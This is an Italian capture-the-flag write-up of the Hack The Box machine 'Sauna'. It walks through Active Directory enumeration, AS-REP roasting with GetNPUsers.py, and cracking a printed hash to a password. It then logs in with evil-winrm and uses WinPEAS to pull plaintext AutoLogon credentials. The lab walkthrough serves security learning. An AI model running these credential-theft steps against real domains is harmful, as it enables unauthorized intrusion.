## Information Gathering

Scopro un servizio aperto sulla porta 80, lo spulcio un po ma non trovo niente di interessante, se non qualche finto (?) nome. 
Con nmap vedo dei servizi aperti quali Kerberos, LDAP, SMB, etc...

Scopro il dominio
```
EGOTISTICAL-BANK.LOCAL
```
A questo punto comincio ad enumerare possibili username sui servizi aperti, partendo da "enum4linux". Solo il servizio LDAP con apposito modulo "--script ldap-search" mi stampa alcuni username, tra cui "Hugo Smith". Lo converto secondo convenzione AD in hsmith, lancio il comando:
```
/GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -no-pass -usersfile ../../sauna/users.txt -dc-ip 10.10.10.175
```

## Custom Scripting

A quanto pare l'username trovato prima è un rabbit hole! Quindi mi organizzo per rintracciare altri usernames. Parto dal FE in ascolto sulla porta 80: uso cewl per creare una wordlist:

```
cewl http://10.10.10.175/index.html -m 4 -w ./wordlist_index.txt
```

Adesso scrivo un piccolo scriptino in python per l'elaborazione di un dizionario di nomi secondo la politica AD partendo da quelli ricavati dal sito web:

```
import os

dic = []
endDict = []
new_String = ""

with open("wordlist_index.txt", "r") as f:
        for x in f.readlines():
                if x[0].isupper():
                        dic.append(x.strip("\n"))
                else:
                        pass

try:
        for y in range(len(dic)):
                new_string = dic[y][0]+dic[y+1]
                endDict.append(new_string.lower())
except:
        print "[!] Un elemento non processato!"
        pass

with open("final_wordlist.txt", "w+") as f:
        for x in endDict:
                f.writelines(x + "\n")

print "[+] Estrazione conclusa con successo! \n Salvo file in: ./final_wordlist.txt"
```

## Kerberoasting

Rilancio GetNPUser.py con la wordlist ora generata e trovo:
```
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:9b248feb79ef759ff87263948669aa13$0c8aeef58ebab047399623f1db5d8df762121fb83753a6ac214cff6a63fe64c7e11bbbbf37463022f5520c2c67cc8b9e9d07d9c487f05eddcb916b09c21808db7c1680dbc55f6a4b970f2057dec7b3bf0497d4bdc92096d8d76b2af9258ec4a775ea11a694caac5f37fee1546844c2de150aeba224fe6e9b07de91fd958430c5346246f157eefa0e3d66fb48a3bd06a64294033de42c759b2d5bce91952b2430a831c0e5050c98817556bf352acfbddb77e1c2c820738ad9fc1f9db42a4dccb59bde2dd43317925f83b7177c9973a34baa1800d3b7a6001f40043b637879118847f674f6f7d2093adcafbbb0569f2b79efbfe487dbc949f1692936e51c0aef18
```

Rompo l'hash con john:

```
Thestrokes23
```

Quindi mi collego alla macchina con:
```
evil-winrm -u fsmith -p Thestrokes23 -i 10.10.10.175
```

e prelevo il primo flag! 


A questo punto uso WinPEAS per enumerare tutte le vulnerabilità presenti per il PrivEsc. 
Trovo le credenziali in chiaro per svc_loanmanager:

```
[+] Looking for AutoLogon credentials(T1012)
    Some AutoLogon credentials were found!!
    DefaultDomainName             :  35mEGOTISTICALBANK
    DefaultUserName               :  35mEGOTISTICALBANK\svc_loanmanager
    DefaultPassword               :  Moneymakestheworldgoround!
```

Lancio il comando per collegarmi:

```
sudo evil-winrm -u svc_loanmgr -p Moneymakestheworldgoround! -i 10.10.10.175
```

E potroò così runnare SharpHound.exe
